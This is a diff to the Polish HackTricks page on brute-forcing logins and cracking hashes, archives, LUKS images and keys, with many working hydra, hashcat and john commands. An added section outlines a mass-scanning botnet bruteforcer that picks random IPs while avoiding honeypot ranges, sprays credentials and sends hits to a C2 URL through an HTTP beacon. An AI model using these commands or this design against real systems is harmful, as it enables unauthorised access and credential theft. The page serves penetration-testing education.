@@ -2,9 +2,9 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Default Credentials
+## Domyślne dane logowania
 
-**Wyszukaj w google** default credentials technologii, która jest używana, lub **wypróbuj te linki**:
+**Wyszukaj w google** domyślne dane logowania dla używanej technologii, lub **wypróbuj te linki**:
 
 - [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 - [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -19,9 +19,9 @@
 - [**https://many-passwords.github.io/**](https://many-passwords.github.io)
 - [**https://theinfocentric.com/**](https://theinfocentric.com/)
 
-## **Create your own Dictionaries**
+## **Stwórz własne słowniki**
 
-Zbierz jak najwięcej informacji o celu i wygeneruj własny słownik. Narzędzia, które mogą pomóc:
+Zbierz jak najwięcej informacji o celu i wygeneruj niestandardowy słownik. Narzędzia, które mogą pomóc:
 
 ### Crunch
 ```bash
@@ -34,7 +34,7 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 ^ Special characters including spac
 crunch 6 8 -t ,@@^^%%
 ```
-### Wordlists oparte na stronach internetowych
+### Słowniki oparte na stronach internetowych
 ```bash
 # Cewl gets words from the victims page
 cewl example.com -m 5 -w words.txt
@@ -47,13 +47,13 @@ cat /path/to/js-urls.txt | python3 getjswords.py
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
-Generuje hasła na podstawie informacji o ofierze (imiona, daty...)
+Generuj hasła na podstawie posiadanej wiedzy o ofierze (imiona, daty...)
 ```
 python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-Narzędzie do generowania wordlist, które pozwala podać zestaw słów, dając możliwość stworzenia wielu wariantów z podanych słów, tworząc unikalną i idealną wordlist do wykorzystania względem konkretnego celu.
+Narzędzie do generowania wordlist, które pozwala podać zestaw słów i tworzyć z nich wiele wariantów, dzięki czemu uzyskasz unikalną, idealną wordlist dla konkretnego targetu.
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -74,7 +74,7 @@ Finished in 0.920s.
 ```
 ### [pydictor](https://github.com/LandGrey/pydictor)
 
-### Listy słów
+### Wordlists
 
 - [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
 - [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
@@ -87,7 +87,15 @@ Finished in 0.920s.
 - [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 - [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-## Usługi
+## Internet-wide bruteforcer workflow (lessons from Go-based scanners)
+
+- Utrzymuj pule workerów dostrojone do architektury (np. ~95 goroutines na `x86_64/arm64`, ~85 na `i686`, ~50 na low-end ARM) i respawn co sekundę, aby zachować stałą współbieżność, przy czym każdy worker obsługuje dokładnie jeden docelowy adres IP zanim zakończy działanie.
+- Generuj losowe publiczne IPv4, ale pomijaj oczywiste zakresy obfitujące w honeypoty lub nieroutowalne: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, cloud-heavy `/8`s (`3/15/16/56`) i DoD-associated `/8`s (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
+- Sondować port usługi z krótkim timeoutem (~2s) przed próbą logowania w cleartext (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin przez HTTP/80) i w razie niepowodzenia pobrania zdalnego słownika/C2 przejść do małej wbudowanej listy poświadczeń.
+- Eksfiltrować trafienia za pomocą małych beaconów HTTP GET, np. `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (kody usług jak `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), używając wspólnego User-Agent przeglądarki, żeby się wtopić.
+- phpMyAdmin spray może brute-force'ować dziesiątki prawdopodobnych ścieżek (~80+) za pomocą `GET /index.php?lang=en`, wykrywać markery PMA (`pmahomme` theme/`phpmyadmin.css`/`navigation.php`) i parsować `codemirror.css?v=X.Y.Z` aby rozgałęzić sposób uwierzytelniania: wersje `<4.9` akceptują GET paramy `pma_username`/`pma_password`; wersje `>=4.9` wymagają POST z `server=1`, CSRF `token` i tymi samymi poświadczeniami.
+
+## Services
 
 Posortowane alfabetycznie według nazwy usługi.
 
@@ -126,7 +134,7 @@ bruter clickhouse -u default -p passwords.txt localhost:9000
 msf> use auxiliary/scanner/couchdb/couchdb_login
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
 ```
-### Rejestr Docker
+### Docker Registry
 ```
 hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
 ```
@@ -141,7 +149,7 @@ ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
 medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
 legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
 ```
-### HTTP Generic Brute
+### HTTP Ogólny Brute
 
 #### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)
 
@@ -157,7 +165,7 @@ legba http.basic --username admin --password wordlists/passwords.txt --target ht
 legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 ```
-### HTTP - Post Formularz
+### HTTP - Formularz POST
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
@@ -410,13 +418,13 @@ legba ssh --username admin --password wordlists/passwords.txt --target localhost
 # Try keys from a folder
 legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
-#### Słabe klucze SSH / przewidywalny PRNG w Debianie
+#### Słabe klucze SSH / przewidywalny PRNG Debiana
 
-Niektóre systemy mają znane luki w ziarnie losowości używanym do generowania materiału kryptograficznego. Może to skutkować drastycznie zredukowaną przestrzenią kluczy, którą można bruteforced za pomocą narzędzi takich jak [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Wstępnie wygenerowane zbiory słabych kluczy są też dostępne, takie jak [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+Niektóre systemy mają znane błędy w ziarne losowym używanym do generowania materiału kryptograficznego. Może to skutkować drastycznie zmniejszoną przestrzenią kluczy, którą można bruteforced za pomocą narzędzi takich jak [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Dostępne są też wcześniej wygenerowane zestawy słabych kluczy, np. [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
-### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)
+### STOMP (ActiveMQ, RabbitMQ, HornetQ i OpenMQ)
 
-Protokół tekstowy STOMP jest powszechnie używanym protokołem komunikatów, który **pozwala na płynną komunikację i interakcję z popularnymi usługami kolejkowania wiadomości** takimi jak RabbitMQ, ActiveMQ, HornetQ i OpenMQ. Zapewnia ustandaryzowane i wydajne podejście do wymiany wiadomości i wykonywania różnych operacji związanych z komunikacją.
+Protokół tekstowy STOMP jest szeroko stosowanym protokołem komunikatów, który **umożliwia płynną komunikację i interakcję z popularnymi usługami kolejkowania wiadomości** takimi jak RabbitMQ, ActiveMQ, HornetQ i OpenMQ. Zapewnia ustandaryzowane i wydajne podejście do wymiany wiadomości oraz wykonywania różnych operacji związanych z przesyłaniem wiadomości.
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
@@ -454,13 +462,13 @@ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
 ```bash
 crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
-## Lokalnie
+## Lokalne
 
 ### Online cracking databases
 
 - [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
-- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 with/without ESS/SSP and with any challenge's value)
-- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures, and archives MSOffice, ZIP, PDF...)
+- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 z/bez ESS/SSP i z dowolną wartością challenge)
+- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures oraz archiwa MSOffice, ZIP, PDF...)
 - [https://crackstation.net/](https://crackstation.net) (Hashes)
 - [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
 - [https://gpuhash.me/](https://gpuhash.me) (Hashes and file hashes)
@@ -470,7 +478,7 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 - [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 - [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-Sprawdź to zanim spróbujesz brute force a Hash.
+Sprawdź to zanim spróbujesz brute force na Hashu.
 
 ### ZIP
 ```bash
@@ -490,8 +498,7 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 ```
 #### Known plaintext zip attack
 
-Musisz znać **plaintext** (lub część plaintextu) **pliku znajdującego się wewnątrz** zaszyfrowanego zipa. Możesz sprawdzić **nazwy i rozmiary plików znajdujących się wewnątrz** zaszyfrowanego zipa uruchamiając: **`7z l encrypted.zip`**\
-
+Musisz znać **plaintext** (lub część plaintext) **pliku znajdującego się wewnątrz** zaszyfrowanego zip. Możesz sprawdzić **nazwy i rozmiary plików znajdujących się wewnątrz** zaszyfrowanego zip uruchamiając: **`7z l encrypted.zip`**\
 Pobierz [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) ze strony releases.
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
@@ -526,7 +533,7 @@ qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
 ### Hasło właściciela PDF
 
-Aby złamać hasło właściciela PDF, zobacz to: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+Aby złamać hasło właściciela PDF sprawdź to: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -560,11 +567,11 @@ john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-### Obraz Lucks
+### Obraz LUKS
 
 #### Metoda 1
 
-Instalacja: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
+Zainstaluj: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
 ```bash
 bruteforce-luks -f ./list.txt ./backup.img
 cryptsetup luksOpen backup.img mylucksopen
@@ -580,7 +587,7 @@ cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
-Kolejny tutorial Luks BF: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
+Kolejny poradnik Luks BF: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
 
 ### Mysql
 ```bash
@@ -597,16 +604,16 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 <figure><img src="../images/image (663).png" alt=""><figcaption></figcaption></figure>
 
-### DPAPI Master Key
+### DPAPI Klucz główny
 
 Użyj [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) a następnie john
 
-### Open Office Pwd Protected Column
+### Kolumna chroniona hasłem w Open Office
 
-Jeśli masz plik xlsx z kolumną zabezpieczoną hasłem, możesz ją odblokować:
+Jeśli masz plik xlsx z kolumną chronioną hasłem, możesz ją odblokować:
 
-- **Prześlij plik na google drive** i hasło zostanie automatycznie usunięte
-- Aby **usunąć** go **ręcznie**:
+- **Prześlij go na google drive** i hasło zostanie automatycznie usunięte
+- Aby **usunąć** ją **ręcznie**:
 ```bash
 unzip file.xlsx
 grep -R "sheetProtection" ./*
@@ -624,7 +631,7 @@ crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 ```
 ## Narzędzia
 
-**Przykłady hashów:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
+**Hash — przykłady:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
 
 ### Hash-identifier
 ```bash
@@ -653,18 +660,18 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 ```
 ### Hashcat
 
-#### Ataki Hashcat
+#### Hashcat attacks
 
-- **Wordlist attack** (`-a 0`) z rules
+- **Wordlist attack** (`-a 0`) z regułami
 
-**Hashcat** jest już dostarczany z **folderem zawierającym rules**, ale możesz znaleźć [**other interesting rules here**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
+**Hashcat** już zawiera **folder zawierający reguły**, ale możesz znaleźć [**other interesting rules here**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
 - **Wordlist combinator** attack
 
-Możliwe jest **połączenie 2 wordlists w 1** za pomocą hashcat.\
-Jeśli lista 1 zawierała słowo **"hello"** a druga zawierała 2 linie ze słowami **"world"** i **"earth"**. Słowa `helloworld` i `helloearth` zostaną wygenerowane.
+Można **połączyć 2 wordlists w 1** za pomocą hashcat.\
+Jeśli lista 1 zawierała słowo **"hello"**, a druga zawierała 2 linie ze słowami **"world"** i **"earth"**, to zostaną wygenerowane słowa `helloworld` i `helloearth`.
 ```bash
 # This will combine 2 wordlists
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
@@ -731,7 +738,7 @@ Cracking Windows Hashes
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
-Cracking powszechnych hashes aplikacji
+Cracking powszechnych aplikacji Hashes
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
@@ -741,4 +748,8 @@ Cracking powszechnych hashes aplikacji
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
 ```
+## Referencje
+
+- [Inside GoBruteforcer: AI-generated server defaults, weak passwords, and crypto-focused campaigns](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
+
 {{#include ../banners/hacktricks-training.md}}
